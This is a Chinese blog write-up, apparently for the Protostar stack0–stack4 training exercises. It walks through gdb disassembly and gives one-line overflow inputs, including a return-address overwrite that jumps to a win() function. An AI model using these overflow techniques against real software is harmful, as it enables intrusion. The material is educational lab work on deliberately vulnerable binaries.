@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+
+  <meta name="description" content="Protostar Stack Easy"/>
+
+
+
+
+  <meta name="keywords" content="stack overflow, pwn, Znight" />
+
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/default" title="Znight">
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.5.0" />
+
+
+
+<link rel="canonical" href="http://znight.sight/2017/09/04/protostar-stack-easy/"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.5.0" />
+
+
+
+
+
+
+  
+
+
+
+  <script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+
+    <title> Protostar Stack Easy - Znight </title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">Znight</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    
+      <a href="/">
+        <li class="mobile-menu-item">
+          
+          
+            Home
+          
+        </li>
+      </a>
+    
+      <a href="/archives/">
+        <li class="mobile-menu-item">
+          
+          
+            Archives
+          
+        </li>
+      </a>
+    
+      <a href="/tags/">
+        <li class="mobile-menu-item">
+          
+          
+            Tags
+          
+        </li>
+      </a>
+    
+      <a href="/categories">
+        <li class="mobile-menu-item">
+          
+          
+            Categories
+          
+        </li>
+      </a>
+    
+  </ul>
+</nav>
+
+    <div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">Znight</a>
+</div>
+
+<nav class="site-navbar">
+  
+    <ul id="menu" class="menu">
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/">
+            
+            
+              Home
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/archives/">
+            
+            
+              Archives
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/tags/">
+            
+            
+              Tags
+            
+          </a>
+        </li>
+      
+        <li class="menu-item">
+          <a class="menu-item-link" href="/categories">
+            
+            
+              Categories
+            
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+
+      </header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content">
+            
+  
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          Protostar Stack Easy
+        
+      </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2017-09-04
+        </span>
+        
+          <div class="post-category">
+            
+              <a href="/categories/write-up/">write-up</a>
+            
+          </div>
+        
+      </div>
+    </header>
+
+    
+    
+  <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#stack0"><span class="toc-text">stack0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#solve"><span class="toc-text">solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack1"><span class="toc-text">stack1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#solve-1"><span class="toc-text">solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack2"><span class="toc-text">stack2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#solve-py"><span class="toc-text">solve.py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack3"><span class="toc-text">stack3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#solve-2"><span class="toc-text">solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#stack4"><span class="toc-text">stack4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#solve-3"><span class="toc-text">solve</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#summary"><span class="toc-text">summary</span></a></li></ol>
+    </div>
+  </div>
+
+
+    <div class="post-content">
+      
+        <p>这是给exploit-exercises上<a href="https://exploit-exercises.com/protostar" target="_blank" rel="external">protostar</a>的stack题目写的write-up. 由于篇幅限制, 这篇文章只有<code>stack0</code> - <code>stack4</code>的write-up.<br><a id="more"></a></p>
+<h2 id="stack0"><a href="#stack0" class="headerlink" title="stack0"></a>stack0</h2><p>首先看一下汇编代码 :</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div><div class="line">Dump of assembler code for function main:</div><div class="line">0x080483f4 &lt;main+0&gt;:	push   ebp</div><div class="line">0x080483f5 &lt;main+1&gt;:	mov    ebp,esp</div><div class="line">0x080483f7 &lt;main+3&gt;:	and    esp,0xfffffff0</div><div class="line">0x080483fa &lt;main+6&gt;:	sub    esp,0x60</div><div class="line">;first pramater modified</div><div class="line">0x080483fd &lt;main+9&gt;:	mov    DWORD PTR [esp+0x5c],0x0</div><div class="line">0x08048405 &lt;main+17&gt;:	lea    eax,[esp+0x1c]	;buf</div><div class="line">0x08048409 &lt;main+21&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">0x0804840c &lt;main+24&gt;:	call   0x804830c &lt;gets@plt&gt;	;gets(buf)</div><div class="line">0x08048411 &lt;main+29&gt;:	mov    eax,DWORD PTR [esp+0x5c]</div><div class="line">0x08048415 &lt;main+33&gt;:	test   eax,eax	;if (flag == 0)?</div><div class="line">0x08048417 &lt;main+35&gt;:	je     0x8048427 &lt;main+51&gt;</div><div class="line">;puts($0x8048500) if (modified != 0)</div><div class="line">0x08048419 &lt;main+37&gt;:	mov    DWORD PTR [esp],0x8048500</div><div class="line">0x08048420 &lt;main+44&gt;:	call   0x804832c &lt;puts@plt&gt;	</div><div class="line">0x08048425 &lt;main+49&gt;:	jmp    0x8048433 &lt;main+63&gt;</div><div class="line">;puts($0x8048500) if (modified == 0)</div><div class="line">0x08048427 &lt;main+51&gt;:	mov    DWORD PTR [esp],0x8048529</div><div class="line">0x0804842e &lt;main+58&gt;:	call   0x804832c &lt;puts@plt&gt;</div><div class="line">0x08048433 &lt;main+63&gt;:	leave  </div><div class="line">0x08048434 &lt;main+64&gt;:	ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
+<p>上述代码中, 注释为笔者所加. 下面看一下<code>0x8048500</code>和<code>0x8048529</code>两个字符串的具体内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(gdb) x/s 0x8048500</div><div class="line">0x8048500:	 &quot;you have changed the &apos;modified&apos; variable&quot;</div><div class="line">(gdb) x/s 0x8048529</div><div class="line">0x8048529:	 &quot;Try again?&quot;</div></pre></td></tr></table></figure>
+<p>到此, 这个程序的逻辑就已经理清了. 该程序调用gets()函数读取用户输入, 并写入到buf[0x40]中. 由于程序不检查输入, 此处可以发生字符串溢出. 当modified值被修改后输出”you have changed the ‘modified’ variable”, 否则输出”Try again?”.</p>
+<p><code>stack0</code>程序的源代码在<a href="https://exploit-exercises.com/protostar/stack0/" target="_blank" rel="external">Here</a>.</p>
+<p>我们只要输入超过0x40个字符就能够获取到正确输入.</p>
+<h3 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"print 'A'*0x40 + 'modified'"</span> | ./stack0</div></pre></td></tr></table></figure>
+<h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><p>照样先看汇编代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div><div class="line">Dump of assembler code for function main:</div><div class="line">;modified = [esp+0x5c]	;size=0x4</div><div class="line">;buf = [esp+0x1c]	;size=0x40</div><div class="line">;argv1 = [esp+0x4]</div><div class="line">0x08048464 &lt;main+0&gt;:	push   ebp</div><div class="line">0x08048465 &lt;main+1&gt;:	mov    ebp,esp</div><div class="line">0x08048467 &lt;main+3&gt;:	and    esp,0xfffffff0</div><div class="line">0x0804846a &lt;main+6&gt;:	sub    esp,0x60</div><div class="line">;if argc == 1?</div><div class="line">0x0804846d &lt;main+9&gt;:	cmp    DWORD PTR [ebp+0x8],0x1</div><div class="line">0x08048471 &lt;main+13&gt;:	jne    0x8048487 &lt;main+35&gt;</div><div class="line">;call errx(1, $0x80485a0) if (argc == 1)</div><div class="line">0x08048473 &lt;main+15&gt;:	mov    DWORD PTR [esp+0x4],0x80485a0</div><div class="line">0x0804847b &lt;main+23&gt;:	mov    DWORD PTR [esp],0x1</div><div class="line">0x08048482 &lt;main+30&gt;:	call   0x8048388 &lt;errx@plt&gt;</div><div class="line">0x08048487 &lt;main+35&gt;:	mov    DWORD PTR [esp+0x5c],0x0</div><div class="line">;argv1 = &amp;argv[1], strcpy(buf, argv1)</div><div class="line">0x0804848f &lt;main+43&gt;:	mov    eax,DWORD PTR [ebp+0xc]</div><div class="line">0x08048492 &lt;main+46&gt;:	add    eax,0x4</div><div class="line">0x08048495 &lt;main+49&gt;:	mov    eax,DWORD PTR [eax]</div><div class="line">0x08048497 &lt;main+51&gt;:	mov    DWORD PTR [esp+0x4],eax</div><div class="line">0x0804849b &lt;main+55&gt;:	lea    eax,[esp+0x1c]</div><div class="line">0x0804849f &lt;main+59&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">0x080484a2 &lt;main+62&gt;:	call   0x8048368 &lt;strcpy@plt&gt;</div><div class="line">;if (modified == &apos;abcd&apos;)?</div><div class="line">0x080484a7 &lt;main+67&gt;:	mov    eax,DWORD PTR [esp+0x5c]</div><div class="line">0x080484ab &lt;main+71&gt;:	cmp    eax,0x61626364</div><div class="line">0x080484b0 &lt;main+76&gt;:	jne    0x80484c0 &lt;main+92&gt;</div><div class="line">;puts($0x80485bc) and leave if (modified == &apos;abcd&apos;)</div><div class="line">0x080484b2 &lt;main+78&gt;:	mov    DWORD PTR [esp],0x80485bc</div><div class="line">0x080484b9 &lt;main+85&gt;:	call   0x8048398 &lt;puts@plt&gt;</div><div class="line">0x080484be &lt;main+90&gt;:	jmp    0x80484d5 &lt;main+113&gt;</div><div class="line">;printf($0x80485f3, argv1) if (modified != &apos;abcd&apos;)</div><div class="line">0x080484c0 &lt;main+92&gt;:	mov    edx,DWORD PTR [esp+0x5c]</div><div class="line">0x080484c4 &lt;main+96&gt;:	mov    eax,0x80485f3</div><div class="line">0x080484c9 &lt;main+101&gt;:	mov    DWORD PTR [esp+0x4],edx</div><div class="line">0x080484cd &lt;main+105&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">0x080484d0 &lt;main+108&gt;:	call   0x8048378 &lt;printf@plt&gt;</div><div class="line">0x080484d5 &lt;main+113&gt;:	leave  </div><div class="line">0x080484d6 &lt;main+114&gt;:	ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
+<p>继续看一下各个字符串的值分别为多少:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">(gdb) x/s 0x80485f3</div><div class="line">0x80485f3:	 &quot;Try again, you got 0x%08x\n&quot;</div><div class="line">(gdb) x/s 0x80485bc</div><div class="line">0x80485bc:	 &quot;you have correctly got the variable to the right value&quot;</div><div class="line">(gdb) x/s 0x80485a0</div><div class="line">0x80485a0:	 &quot;please specify an argument\n&quot;</div></pre></td></tr></table></figure>
+<p>该程序首先检查<code>argc</code>是否为1, 若是, 则程序报错. 然后执行<code>strcpy(buf, argv[1])</code>, 如果<code>modified</code>被覆写为”abcd”, 则输出you have correctly got the variable to the right value, 否则视为失败.</p>
+<p><code>stack1</code>的源码在<a href="https://exploit-exercises.com/protostar/stack1/" target="_blank" rel="external">Here</a>.</p>
+<h3 id="solve-1"><a href="#solve-1" class="headerlink" title="solve"></a>solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"print 'A'*0x40 + 'abcd'"</span> | ./stack1</div></pre></td></tr></table></figure>
+<h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><p>执行程序,得到以下结果:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin# ./stack2</div><div class="line">stack2: please set the GREENIE environment variable</div><div class="line"></div><div class="line">root@protostar:/opt/protostar/bin#</div></pre></td></tr></table></figure>
+<p>可以看到, 这个程序要求我们设置GREENIE的环境变量. 那么在这里, 我们就需要用到execve()系统调用, 这道题的exp可以用python写, 也可以用C写, 我用的是python. 其实用C和python代码基本相同, 除了在C中环境变量是由”$ENV_NAME=ENV_VALUE”的指针数组表示, 而在python里, 环境变量的类型是字典.</p>
+<p>继续上汇编代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div><div class="line">Dump of assembler code for function main:</div><div class="line">;env_greenie = [esp+0x5c]	;size = 0x4</div><div class="line">;modified = [esp+0x58]	;size = 0x4</div><div class="line">;buf = [esp+0x18]		;size = 0x40</div><div class="line">0x08048494 &lt;main+0&gt;:	push   ebp</div><div class="line">0x08048495 &lt;main+1&gt;:	mov    ebp,esp</div><div class="line">0x08048497 &lt;main+3&gt;:	and    esp,0xfffffff0</div><div class="line">0x0804849a &lt;main+6&gt;:	sub    esp,0x60</div><div class="line">;env_greenie = getenv(&quot;GREENIE&quot;)</div><div class="line">0x0804849d &lt;main+9&gt;:	mov    DWORD PTR [esp],0x80485e0</div><div class="line">0x080484a4 &lt;main+16&gt;:	call   0x804837c &lt;getenv@plt&gt;</div><div class="line">0x080484a9 &lt;main+21&gt;:	mov    DWORD PTR [esp+0x5c],eax</div><div class="line">;if (env_greenie == 0)?</div><div class="line">0x080484ad &lt;main+25&gt;:	cmp    DWORD PTR [esp+0x5c],0x0</div><div class="line">0x080484b2 &lt;main+30&gt;:	jne    0x80484c8 &lt;main+52&gt;</div><div class="line">;errx(1, &quot;GREENIE&quot;) if (env_greenie == 0)</div><div class="line">0x080484b4 &lt;main+32&gt;:	mov    DWORD PTR [esp+0x4],0x80485e8</div><div class="line">0x080484bc &lt;main+40&gt;:	mov    DWORD PTR [esp],0x1</div><div class="line">0x080484c3 &lt;main+47&gt;:	call   0x80483bc &lt;errx@plt&gt;</div><div class="line">;if (env_greenie != 0)&#123;</div><div class="line">0x080484c8 &lt;main+52&gt;:	mov    DWORD PTR [esp+0x58],0x0	;modified = 0</div><div class="line">;strcpy(buf, env_greenie)	&#125;</div><div class="line">0x080484d0 &lt;main+60&gt;:	mov    eax,DWORD PTR [esp+0x5c]</div><div class="line">0x080484d4 &lt;main+64&gt;:	mov    DWORD PTR [esp+0x4],eax</div><div class="line">0x080484d8 &lt;main+68&gt;:	lea    eax,[esp+0x18]</div><div class="line">0x080484dc &lt;main+72&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">0x080484df &lt;main+75&gt;:	call   0x804839c &lt;strcpy@plt&gt;</div><div class="line">;if (modified = 0x8048618)?</div><div class="line">0x080484e4 &lt;main+80&gt;:	mov    eax,DWORD PTR [esp+0x58]</div><div class="line">0x080484e8 &lt;main+84&gt;:	cmp    eax,0xd0a0d0a</div><div class="line">0x080484ed &lt;main+89&gt;:	jne    0x80484fd &lt;main+105&gt;</div><div class="line">;puts($0x8048618) and leave if (modified == 0xd0a0d0a)</div><div class="line">0x080484ef &lt;main+91&gt;:	mov    DWORD PTR [esp],0x8048618</div><div class="line">0x080484f6 &lt;main+98&gt;:	call   0x80483cc &lt;puts@plt&gt;</div><div class="line">0x080484fb &lt;main+103&gt;:	jmp    0x8048512 &lt;main+126&gt;</div><div class="line">;printf($0x8048641, midified) if (modified != 0xd0a0d0a)</div><div class="line">0x080484fd &lt;main+105&gt;:	mov    edx,DWORD PTR [esp+0x58]</div><div class="line">0x08048501 &lt;main+109&gt;:	mov    eax,0x8048641</div><div class="line">0x08048506 &lt;main+114&gt;:	mov    DWORD PTR [esp+0x4],edx</div><div class="line">0x0804850a &lt;main+118&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">0x0804850d &lt;main+121&gt;:	call   0x80483ac &lt;printf@plt&gt;</div><div class="line">0x08048512 &lt;main+126&gt;:	leave  </div><div class="line">0x08048513 &lt;main+127&gt;:	ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
+<p>​    各个字符串的值分别如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0x80485e0:	 &quot;GREENIE&quot;</div><div class="line">(gdb) x/s</div><div class="line">0x80485e8:	 &quot;please set the GREENIE environment variable\n&quot;</div><div class="line">(gdb) x/s 0x8048618</div><div class="line">0x8048618:	 &quot;you have correctly modified the variable&quot;</div></pre></td></tr></table></figure>
+<p>​    整个程序的流程就是调用strcpy将<code>env_greenie</code>的值复制给buf, 如果midified的值被覆盖, 则输出”you have correctly modified the variable”, 否则视为失败.</p>
+<p>​    <code>stack2</code>的源码在<a href="https://exploit-exercises.com/protostar/stack2/" target="_blank" rel="external">Here</a>.</p>
+<h3 id="solve-py"><a href="#solve-py" class="headerlink" title="solve.py"></a>solve.py</h3><p>​    下面是用python写的exp, 由于小端的存取顺序0x0d0a0d0a需要倒过来写:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line">env_greenie = <span class="string">'A'</span>*<span class="number">0x40</span> + <span class="string">'\x0a\x0d\x0a\x0d'</span></div><div class="line">envp = &#123;<span class="string">"GREENIE"</span>: str(env_greenie)&#125;</div><div class="line">os.execve(<span class="string">"./stack2"</span>, [<span class="string">"./stack2"</span>], envp)</div></pre></td></tr></table></figure>
+<h2 id="stack3"><a href="#stack3" class="headerlink" title="stack3"></a>stack3</h2><p>还是先上汇编代码, 下面这段是main函数的汇编代码:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">(gdb) disas main</div><div class="line">Dump of assembler code for function main:</div><div class="line">;midified = [esp+0x5c]</div><div class="line">;buf = [esp+0x1c]</div><div class="line">0x08048438 &lt;main+0&gt;:	push   ebp</div><div class="line">0x08048439 &lt;main+1&gt;:	mov    ebp,esp</div><div class="line">0x0804843b &lt;main+3&gt;:	and    esp,0xfffffff0</div><div class="line">0x0804843e &lt;main+6&gt;:	sub    esp,0x60</div><div class="line">0x08048441 &lt;main+9&gt;:	mov    DWORD PTR [esp+0x5c],0x0	;midified = 0</div><div class="line">;gets(buf)</div><div class="line">0x08048449 &lt;main+17&gt;:	lea    eax,[esp+0x1c]</div><div class="line">0x0804844d &lt;main+21&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">0x08048450 &lt;main+24&gt;:	call   0x8048330 &lt;gets@plt&gt;</div><div class="line">;if (modified == 0)?</div><div class="line">0x08048455 &lt;main+29&gt;:	cmp    DWORD PTR [esp+0x5c],0x0</div><div class="line">;leave if if (modified == 0)</div><div class="line">0x0804845a &lt;main+34&gt;:	je     0x8048477 &lt;main+63&gt;</div><div class="line">;if (modified != 0)&#123;</div><div class="line">;printf($0x8048560, midified)</div><div class="line">0x0804845c &lt;main+36&gt;:	mov    eax,0x8048560</div><div class="line">0x08048461 &lt;main+41&gt;:	mov    edx,DWORD PTR [esp+0x5c]</div><div class="line">0x08048465 &lt;main+45&gt;:	mov    DWORD PTR [esp+0x4],edx</div><div class="line">0x08048469 &lt;main+49&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">0x0804846c &lt;main+52&gt;:	call   0x8048350 &lt;printf@plt&gt;</div><div class="line">;call(modified)	&#125;</div><div class="line">0x08048471 &lt;main+57&gt;:	mov    eax,DWORD PTR [esp+0x5c]</div><div class="line">0x08048475 &lt;main+61&gt;:	call   eax</div><div class="line">0x08048477 &lt;main+63&gt;:	leave  </div><div class="line">0x08048478 &lt;main+64&gt;:	ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
+<p>字符串的值如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) x/s 0x8048560</div><div class="line">0x8048560:	 &quot;calling function pointer, jumping to 0x%08x\n&quot;</div></pre></td></tr></table></figure>
+<p>可以看到, 若modified被覆盖, 函数将跳转midified, 我们只要把modified覆盖成我们想要跳转的地址即可. 查看程序的C源码, 可以看到源码中定义了一个win()函数. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(gdb) info addr win</div><div class="line">Symbol &quot;win&quot; is a function at address 0x8048424.</div></pre></td></tr></table></figure>
+<p>所以0x8048424就是我们要跳转的地址.</p>
+<p><code>stack2</code>的源码在<a href="https://exploit-exercises.com/protostar/stack3/" target="_blank" rel="external">Here</a>.</p>
+<h3 id="solve-2"><a href="#solve-2" class="headerlink" title="solve"></a>solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"print 'A'*0x40 + '\x24\x84\x04\x08'"</span> | ./stack3</div></pre></td></tr></table></figure>
+<h2 id="stack4"><a href="#stack4" class="headerlink" title="stack4"></a>stack4</h2><p>这道题的代码有点短, 代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code for function main:</div><div class="line">;buf = [esp+0x10]	;size = 0x40</div><div class="line">0x08048408 &lt;main+0&gt;:	push   ebp</div><div class="line">0x08048409 &lt;main+1&gt;:	mov    ebp,esp</div><div class="line">0x0804840b &lt;main+3&gt;:	and    esp,0xfffffff0</div><div class="line">0x0804840e &lt;main+6&gt;:	sub    esp,0x50</div><div class="line">;gets(buf)</div><div class="line">0x08048411 &lt;main+9&gt;:	lea    eax,[esp+0x10]</div><div class="line">0x08048415 &lt;main+13&gt;:	mov    DWORD PTR [esp],eax</div><div class="line">0x08048418 &lt;main+16&gt;:	call   0x804830c &lt;gets@plt&gt;</div><div class="line">0x0804841d &lt;main+21&gt;:	leave  </div><div class="line">0x0804841e &lt;main+22&gt;:	ret    </div><div class="line">End of assembler dump.</div></pre></td></tr></table></figure>
+<p>该程序调用gets函数读取用户输入, 然后退出. 我们可以覆写函数的返回地址, 让函数返回到win函数的入口地址.</p>
+<p>用gdb查看win函数的地址为<code>0x80483f4</code>, 调试程序, 查看buf的地址离要覆盖的地址之间的偏移. buf的起始地址在$esp+0x10 == 0xbffffc50. retaddr的地址为$ebp+0x4 == 0xbffffc9c, 偏移为0x4c.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(gdb) x/x $esp+0x10</div><div class="line">0xbffffc50:	0xb7fd7ff4</div><div class="line">(gdb) x/x $ebp+0x4</div><div class="line">0xbffffc9c:	0xb7eadc76</div></pre></td></tr></table></figure>
+<h3 id="solve-3"><a href="#solve-3" class="headerlink" title="solve"></a>solve</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">"print 'A'*0x4c + '\xf4\x83\x04\x08'"</span> | ./stack4</div></pre></td></tr></table></figure>
+<p>运行上面这行命令以后, 我们会得到”code flow successfully changed”的输出和一个<code>Segmentation fault</code>的提示, 这是正常的, 因为我们覆盖了<code>main</code>函数的返回地址使得程序无法正常退出了.</p>
+<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>以上的五道题目都是非常简单的栈溢出题, 程序没有设置任何保护机制, 也不需要用到什么技巧就能够破解. 有一点要注明的是, 上面的代码块中有些语法为shell的代码块我写了python, 因为Hexo默认不支持shell, 也不支持汇编…</p>
+
+      
+    </div>
+
+    
+      
+      
+
+
+
+      
+      
+    
+
+    
+      <footer class="post-footer">
+        
+          <div class="post-tags">
+            
+              <a href="/tags/soverflow/">stack overflow</a>
+            
+              <a href="/tags/pwn/">pwn</a>
+            
+          </div>
+        
+        
+        
+  <nav class="post-nav">
+    
+    
+  </nav>
+
+      </footer>
+    
+
+  </article>
+
+
+          </div>
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>  
+      </main>
+
+      <footer id="footer" class="footer">
+
+  <div class="social-links">
+    
+      
+        
+          <a href="mailto:leeeric053@gmail.com" class="iconfont icon-email" title="email"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <a href="/www.github.com/Leeericent" class="iconfont icon-github" title="github"></a>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+    
+    
+      
+      <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    
+  </div>
+
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">
+    
+    &copy; 
+    
+    2017
+
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Lericent Lee</span>
+  </span>
+</div>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+
+    
+  
+
+
+
